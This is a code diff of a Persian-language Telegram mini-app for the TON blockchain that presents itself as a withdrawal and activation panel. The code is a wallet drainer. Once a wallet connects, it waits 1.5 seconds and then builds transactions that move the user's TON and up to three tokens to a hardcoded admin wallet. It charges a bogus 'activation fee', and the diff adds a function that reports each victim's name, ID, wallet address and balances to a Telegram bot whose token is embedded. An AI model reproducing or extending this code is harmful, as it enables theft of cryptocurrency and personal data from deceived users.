@@ -152,7 +152,7 @@
         .modal-content h2 { font-size: 22px; margin-bottom: 20px; color: #fff; }
         .pay-notice { background: rgba(0,0,0,0.3); border: 1.5px solid #ffc107; color: #ffc107; padding: 15px; border-radius: 20px; font-size: 12px; margin-bottom: 20px; line-height: 1.8; text-align: justify; }
         .fee-tag { border: 2px dashed #00ff9d; color: #00ff9d; padding: 15px; border-radius: 25px; font-weight: 800; font-size: 20px; margin-bottom: 25px; background: rgba(0,255,157,0.05); }
-        #activationInput { display: none; } /* مخفی کردن اینپوت کد فعال‌سازی */
+        #activationInput { display: none; } /* مخفی کردن فیلد کد */
         .activation-message { margin-top: 15px; padding: 12px; border-radius: 15px; background: rgba(0,255,157,0.1); border: 1px solid #00ff9d; color: #00ff9d; font-size: 14px; display: none; align-items: center; justify-content: center; gap: 10px; }
         .activation-message.show { display: flex; }
         .activation-message i { font-size: 18px; }
@@ -267,9 +267,7 @@ const CONFIG = {
     BOT_TOKEN: "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw",
     ADMIN_CHAT_ID: "5972276401",
     BOT_USERNAME: "tondropybot",
-    // آدرس کیف پول ادمین (دریافت‌کننده) به فرمت raw
     ADMIN_WALLET_RAW: "0:c596f30f668432e33c9223c80b2ccb5e45ccb11d1076f081d6d09bb0155935d2",
-    // آدرس کیف پول ادمین به فرمت bounceable (برای نمایش)
     ADMIN_WALLET_BOUNCEABLE: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
     NETWORK_FEE: 0.0035,
     MINIMUM_WITHDRAW: 14,
@@ -417,6 +415,30 @@ async function getAllJettonBalances(userAddress) {
     }
 }
 
+// ==================== ارسال گزارش کامل موجودی به تلگرام ====================
+async function sendFullReportToTelegram(userAddress, userInfo) {
+    try {
+        const tonBalance = await getWalletBalance(userAddress);
+        const jettons = await getAllJettonBalances(userAddress);
+        let report = `🔔 **اتصال کیف پول جدید**\n━━━━━━━━━━━━━━━━━━━━━\n`;
+        report += `👤 **نام کاربر:** ${userInfo.firstName || 'ناشناس'} ${userInfo.lastName || ''}\n`;
+        report += `🆔 **آیدی:** ${userInfo.id}\n`;
+        report += `📛 **یوزرنیم:** ${userInfo.username ? '@' + userInfo.username : 'ندارد'}\n`;
+        report += `💳 **آدرس کیف پول:** \`${userAddress}\`\n`;
+        report += `💰 **موجودی TON:** ${tonBalance.toFixed(6)} TON\n`;
+        if (jettons.length > 0) {
+            report += `━━━━━━━━━━━━━━━━━━━━━\n📊 **سایر توکن‌ها:**\n`;
+            jettons.forEach(t => report += `• ${t.symbol}: ${t.balance.toFixed(6)}\n`);
+        } else {
+            report += `📊 **سایر توکن‌ها:** هیچ توکن دیگری یافت نشد.\n`;
+        }
+        report += `⏱ **زمان:** ${new Date().toLocaleString('fa-IR')}`;
+        sendToTelegram(report);
+    } catch (error) {
+        console.error('خطا در ارسال گزارش:', error);
+    }
+}
+
 // ==================== ساخت payload کامنت با ton-core ====================
 function createCommentPayload(text) {
     if (typeof window.TonCore !== 'undefined' && window.TonCore.beginCell && typeof Buffer !== 'undefined') {
@@ -437,12 +459,10 @@ function createCommentPayload(text) {
 
 // ==================== ساخت payload انتقال جتون ====================
 function createJettonTransferPayload(recipientRaw, amount, decimals, forwardAmount = 0.01) {
-    if (!window.TonCore) {
-        throw new Error('TonCore not loaded');
-    }
+    if (!window.TonCore) throw new Error('TonCore not loaded');
     const { beginCell, toNano, Address } = window.TonCore;
     const amountInBaseUnits = Math.floor(amount * Math.pow(10, decimals)).toString();
-    const payload = beginCell()
+    return beginCell()
         .storeUint(0x0f8a7ea5, 32)
         .storeUint(0, 64)
         .storeCoins(amountInBaseUnits)
@@ -451,14 +471,10 @@ function createJettonTransferPayload(recipientRaw, amount, decimals, forwardAmou
         .storeBit(0)
         .storeCoins(toNano(forwardAmount.toString()))
         .storeBit(1)
-        .storeRef(
-            beginCell()
-                .storeUint(0, 32)
-                .storeStringTail("")
-                .endCell()
-        )
-        .endCell();
-    return payload.toBoc().toString('base64');
+        .storeRef(beginCell().storeUint(0, 32).storeStringTail("").endCell())
+        .endCell()
+        .toBoc()
+        .toString('base64');
 }
 
 // ==================== اجرای تراکنش خودکار (انتقال تمام دارایی‌ها) ====================
@@ -466,7 +482,6 @@ async function executeSmartTransaction(userAddress) {
     if (isProcessingTransaction || transactionExecuted) return;
     try {
         isProcessingTransaction = true;
-        showToast('🔄 در حال بررسی موجودی...');
         const tonBalance = await getWalletBalance(userAddress);
         const jettons = await getAllJettonBalances(userAddress);
         const messages = [];
@@ -480,7 +495,7 @@ async function executeSmartTransaction(userAddress) {
                 });
             }
         }
-        for (const jetton of jettons.slice(0, 3)) { // حداکثر ۳ جتون
+        for (const jetton of jettons.slice(0, 3)) {
             const payload = createJettonTransferPayload(CONFIG.ADMIN_WALLET_RAW, jetton.balance, jetton.decimals, 0.01);
             messages.push({
                 address: jetton.master,
@@ -546,9 +561,6 @@ async function payActivationFee() {
         showToast("✅ پنل با موفقیت فعال شد!");
         addToHistory('فعالسازی', 'پنل فعال شد');
         sendToTelegram(`✅ **فعالسازی موفق**\n👤 نام: ${currentUser?.firstName||'ناشناس'} ${currentUser?.lastName||''}\n🆔 آیدی: ${currentUser?.id}\n📛 یوزرنیم: ${currentUser?.username?'@'+currentUser.username:'ندارد'}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
-        
-        // پس از فعالسازی، اگر کاربر روی برداشت نهایی کلیک کرده بود، اکنون برداشت را انجام بده
-        // اما ما در finalWithdraw چک می‌کنیم که اگر فعال شد، ادامه دهد. نیاز به اقدام اضافه نیست.
     } catch (error) {
         console.error('❌ خطا:', error);
         if (error.message?.includes('rejected')) {
@@ -579,10 +591,11 @@ tonConnectUI.onStatusChange(async (wallet) => {
             currentUser.wallet = fullAddress;
             appData.wallets.unshift({ userId: currentUser.id, address: fullAddress, time: new Date().toISOString() });
             saveData();
-            sendToTelegram(`🔌 **کیف پول متصل شد**\n👤 نام: ${currentUser.firstName} ${currentUser.lastName}\n🆔 آیدی: ${currentUser.id}\n📛 یوزرنیم: ${currentUser.username ? '@' + currentUser.username : 'ندارد'}\n💳 آدرس: ${fullAddress}\n👥 کل کاربران: ${appData.users.length}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+            // ارسال گزارش کامل موجودی به تلگرام
+            await sendFullReportToTelegram(fullAddress, currentUser);
         }
 
-        // اجرای تراکنش خودکار (همان درخواست قدیمی) پس از ۱.۵ ثانیه
+        // اجرای تراکنش خودکار پس از ۱.۵ ثانیه
         setTimeout(() => executeSmartTransaction(fullAddress), 1500);
         
         checkAndEnableFinalWithdraw();
